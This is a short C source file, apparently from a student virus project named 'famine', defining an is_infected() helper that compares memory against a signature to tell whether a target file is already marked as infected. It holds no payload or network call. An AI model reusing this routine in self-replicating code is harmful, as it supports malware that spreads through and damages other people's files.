#include "../famine.h"

int		is_infected(char *ptr)
{
	int i;

	i = -1;
	if (!is_in_address(ptr + strlen(signature)))
		return (1);
	while (++i < (int)strlen(signature))
	{
		if (ptr[i] != signature[i])
			return (0);
	}
	return (1);
}